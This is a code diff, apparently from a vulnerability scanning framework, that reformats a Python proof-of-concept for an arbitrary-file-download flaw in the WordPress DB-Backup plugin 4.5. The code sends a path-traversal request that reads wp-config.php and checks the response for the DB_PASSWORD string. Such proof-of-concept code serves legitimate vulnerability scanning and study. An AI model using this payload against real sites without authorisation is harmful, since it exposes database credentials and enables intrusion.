@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0024' # 平台漏洞编号，留空
+    vuln_id = 'WordPress_0024'  # 平台漏洞编号，留空
     name = 'WordPress DB-Backup Plugin 4.5 /download.php 任意文件下载漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2014-11-26'  # 漏洞公布时间
     desc = '''
         DB Backup plugin for WordPress contains a flaw that allows traversing outside of
@@ -28,6 +29,7 @@ class Vuln(ABVuln):
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'WordPress DB-Backup Plugin 4.5'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'ced5c830-8c05-413b-ad41-a67895af73c8'
     author = '47bwy'  # POC编写者
@@ -40,21 +42,22 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php'
             verify_url = self.target + payload
             req = urllib2.Request(verify_url)
             content = urllib2.urlopen(req).read()
-            
+
             if 'DB_PASSWORD' in content and 'wp-settings.php' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
